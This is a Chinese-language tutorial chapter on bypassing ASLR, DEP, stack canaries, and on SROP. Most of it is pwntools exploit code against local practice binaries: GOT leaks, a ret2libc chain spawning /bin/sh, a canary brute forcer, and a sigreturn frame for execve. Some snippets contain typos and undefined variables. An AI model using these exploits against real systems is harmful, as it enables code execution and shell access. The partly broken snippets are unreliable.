# 漏洞缓解机制绕过

### 7.1 ASLR绕过

ASLR通过随机化地址布局增加利用难度。绕过ASLR的核心思路是信息泄露。

**绕过方法：**

1. **格式化字符串泄露**：通过`%p`泄露栈上的libc地址
2. **内存读取漏洞**：利用越界读取泄露地址
3. **爆破**：32位系统ASLR熵有限，可爆破（但成功率低）
4. **fork子进程**：fork子进程继承父进程地址空间
5. **部分覆盖**：只覆盖地址的低字节（12位不随机化）
6. **文件描述符泄露**：通过proc文件系统泄露

**信息泄露利用：**

```python
from pwn import *

context.arch = 'amd64'

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 方法1: 通过puts泄露GOT表
# 构造ROP: puts(puts@GOT) -> ret to main
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
payload = b'A' * 72 + rop.chain()
p.sendline(payload)

# 接收泄露的地址
leaked = p.recvline()
puts_addr = u64(leaked[:6].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
print(f"libc基址: {hex(libc_base)}")

# 方法2: 通过格式化字符串泄露
p.sendline(b'%p%p%p%p')  # 泄露栈上数据

# 方法3: 利用输出函数泄露任意地址
# 如果程序有类似printf(user_buffer)的漏洞
p.sendline(b'%7$s' + p64(elf.got['puts']))  # 泄露puts真实地址
```

### 7.2 ROP绕过DEP

DEP（Data Execution Prevention）阻止在数据段执行代码。ROP通过复用代码段中已有的指令片段绕过DEP。

**完整ROP利用流程：**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# 步骤1: 泄露libc地址
# 使用pop rdi; ret gadget
pop_rdi = 0x400c83  # ROPgadget查找得到
ret = 0x400c84      # 用于栈对齐

# 构造: puts(puts@GOT) -> main
payload1 = b'A' * 72
payload1 += p64(pop_rdi)          # pop rdi; ret
payload1 += p64(elf.got['puts'])  # rdi = puts@GOT
payload1 += p64(elf.plt['puts'])  # call puts
payload1 += p64(elf.symbols['main'])  # 返回main

p.sendline(payload1)

# 接收泄露
p.recvline()  # 消耗多余行
leaked = p.recvline()
puts_addr = u64(leaked[:6].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc基址: {hex(libc_base)}")
log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(binsh)}")

# 步骤2: 调用system("/bin/sh")
# 需要栈对齐: x64要求调用前rsp%16==0
# 如果不对齐，加一个ret
payload2 = b'A' * 72
payload2 += p64(ret)              # 栈对齐
payload2 += p64(pop_rdi)          # pop rdi; ret
payload2 += p64(binsh)            # rdi = "/bin/sh"
payload2 += p64(system)           # call system

p.sendline(payload2)
p.interactive()
```

### 7.3 Bypass Canary

Canary（栈金丝雀）在返回地址前放置随机值，函数返回前检查是否被篡改。

**绕过方法：**

1. **信息泄露泄露Canary**：

```python
from pwn import *

context.arch = 'amd64'

p = process('./vuln_canary')

# Canary通常以\x00开头，在栈上特定位置
# 通过格式化字符串或越界读取泄露

# 方法1: 格式化字符串泄露
p.sendline(b'%11$p')  # 泄露栈上的Canary
canary_line = p.recvline()
canary = int(canany_line.strip(), 16)
print(f"Canary: {hex(canary)}")

# 方法2: 越界读取
# 如果程序有类似printf(buf)的输出
# 先发送不完整的溢出，让程序输出到Canary位置
```

2. **多线程爆破Canary**：

```python
# 在fork的子进程中，Canary与父进程相同
# 子进程崩溃不影响父进程
# 可以逐字节爆破（8字节 * 256 = 2048次尝试）

from pwn import *

context.arch = 'amd64'

def brute_canary():
    canary = b'\x00'  # Canary首字节为\x00
    for i in range(1, 8):
        for byte in range(256):
            try:
                p = process('./vuln_fork')
                p.sendline(b'A' * 24 + canary + bytes([byte]))
                result = p.recvall(timeout=0.5)
                if b'OK' in result:  # 程序正常返回说明Canary正确
                    canary += bytes([byte])
                    print(f"Canary[{i}] = {hex(byte)}")
                    p.close()
                    break
                p.close()
            except:
                p.close()
    return u64(canary.ljust(8, b'\x00'))

canary = brute_canary()
print(f"完整Canary: {hex(canary)}")

# 利用时保持Canary不变
payload = b'A' * 24
payload += p64(canary)        # 保持Canary不变
payload += b'B' * 8          # 覆盖保存的RBP
payload += p64(ret_addr)     # 覆盖返回地址
```

### 7.4 SROP

SROP（Sigreturn-Oriented Programming）利用`sigreturn`系统调用伪造信号帧，一次性设置所有寄存器。

**原理：**

1. 触发`sigreturn`系统调用（通过伪造信号处理返回）
2. 内核从栈上读取`sigcontext`结构，恢复所有寄存器
3. 攻击者构造伪造的`sigcontext`，控制所有寄存器

**sigcontext结构（x64）：**

```c
struct sigcontext {
    __u64 r8;
    __u64 r9;
    __u64 r10;
    __u64 r11;
    __u64 r12;
    __u64 r13;
    __u64 r14;
    __u64 r15;
    __u64 rdi;
    __u64 rsi;
    __u64 rbp;
    __u64 rbx;
    __u64 rdx;
    __u64 rax;
    __u64 rcx;
    __u64 rsp;
    __u64 rip;
    __u64 eflags;
    // ... 其他字段
};
```

**SROP利用：**

```python
from pwn import *

context.arch = 'amd64'

elf = ELF('./srop_vuln')

# 需要找到:
# 1. 一个syscall gadget
# 2. 能设置rax=15 (sigreturn系统调用号)
# 或者程序中有触发sigreturn的路径

# 假设已知
syscall_addr = 0x400500
mov_rax_15_ret = 0x400600  # 设置rax=15然后ret到syscall

# 使用pwntools构造SigreturnFrame
frame = SigreturnFrame()
frame.rax = 59              # execve系统调用号
frame.rdi = binsh_addr      # "/bin/sh"地址
frame.rsi = 0               # argv=NULL
frame.rdx = 0               # envp=NULL
frame.rip = syscall_addr    # 执行syscall
frame.rsp = new_stack_addr  # 新的栈指针

payload = b'A' * offset
payload += p64(mov_rax_15_ret)  # 设置rax=15
payload += p64(syscall_addr)     # 执行sigreturn
payload += bytes(frame)          # 伪造的信号帧

p = process('./srop_vuln')
p.sendline(payload)
p.interactive()
```
